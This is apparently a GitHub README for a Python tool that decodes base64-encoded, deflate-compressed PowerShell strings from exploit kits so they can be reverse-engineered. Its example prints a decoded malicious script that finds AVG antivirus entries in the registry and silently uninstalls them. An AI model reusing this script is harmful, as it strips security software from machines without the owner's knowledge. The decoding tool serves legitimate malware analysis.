# deflate64
Deflate64 - Decripting Base 64 strings, uncompress content

Some sploits are a collection of Microsoft Powershell modules that can be used to penetrate systems. The majority of this is made with encrypt strings in 64 and after that compressed
in deflate format.
This program decrypt base 64 strings and uncompress them, allowed you to do a reverse engineering and understood the code. 

### Usage

To get the list of basic options and information about the project:

python deflate64.py -h

### Examples of use:

```sh
 python undeflate64.py -u "xZJRa8IwFIXfBf/DJfRBZbWg4sNEhgzdxuYm1tk9FCTEaw2LiUsiCl3/+zKZYp3uaWOPPff03O8e4q0kl8ZSIeo1A21IGAdye//Qv4zDp94o6gy7caTWzUa99qimGPc508qomY0jLqdqbeLrldYo7Ri14UrGz7s8Au8wUxopm0MKyRK8SXUQDqidQ+ZGV070JuAL/opAKp3xTYVsBwYFMgv7nNBqLpNWseDtUZuNc6j/iFcsfMWVDkGBS8iBlyHNn+IuOfysHiWDP8SloMxR9A3vbpBVcYPkgpCDSXB3LLx8Cq2fN400X5TKzsRneebd1QOtEk0X0OMCTYWU0wyFwdTZtPWXWjE0BsjCcNxhgU914rRgk1sFELxJCKQraPuz80WUW8iy1qna6rV8be5pHtXmHO2c4c9q+77pdG3O98u1ucTztX0A"--txt example.txt
```

Result (content example.txt):
 
 ```sh
&uninstall32s = gci "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall" | foreach { gp $_.PSPath } | ? { $_ -like "*AVG*" } | select UninstallString;
$uninstall64s = gci "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall" | foreach { gp $_.PSPath } | ? { $_ -like "*AVG*" } | select UninstallString;

foreach($uninstall64 in $uninstall64s) {
$uninstall64 = $uninstall64.UninstallString -Replace "MsiExec.exe","" -Replace "/I","" -Replace "/X","";
$uninstall64 = $uninstall64.Trim();
if($uninstall64 -like "*Program Files*"){}else{start-process "msiexec.exe" -args "/x $uninstall64  /qn /norestart" -Wait }};
foreach($uninstall32 in $uninstall32s) {
$uninstall32 = $uninstall32.UninstallString -Replace "MsiExec.exe","" -Replace "/I","" -Replace "/X","";
$uninstall32 = $uninstall32.Trim();
if($uninstall32 -like "*Program Files*"){}else{start-process "msiexec.exe" -args "/x $uninstall32  /qn /norestart" -Wait }};
```
